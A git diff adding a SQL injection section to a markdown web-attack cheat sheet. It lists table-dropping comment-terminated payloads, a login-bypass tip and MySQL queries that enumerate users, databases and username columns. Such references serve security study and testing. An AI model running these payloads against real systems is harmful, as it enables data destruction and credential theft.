@@ -41,4 +41,33 @@ Injects malicious code to a web page
 
 and more on [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 ### SQL Injection
+#### Description
+Inject SQL syntax to a vulnerble server
+#### Attacking Vectors
+##### Comment the rest of the query
+`DROP TABLE1; --`
+
+or
+
+`DROP TABLE1; #`
+##### Login bypass
+use `'` and `--` to close brackets and comment the queries
+##### Common Vectors(MySQL for example)
+`SELECT @@version`
+
+`SELECT user();`
+
+`SELECT user FROM mysql.user;`
+
+`SELECT distinct(db) FROM mysql.db `
+
+`SELECT schema_name FROM information_schema.schemata; (for MySQL >= v5.0)`
+
+`SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`
+
+`SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`
+
+`SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’`
 ### CSRF (Cross-Site-Request-Forgery)
+
+
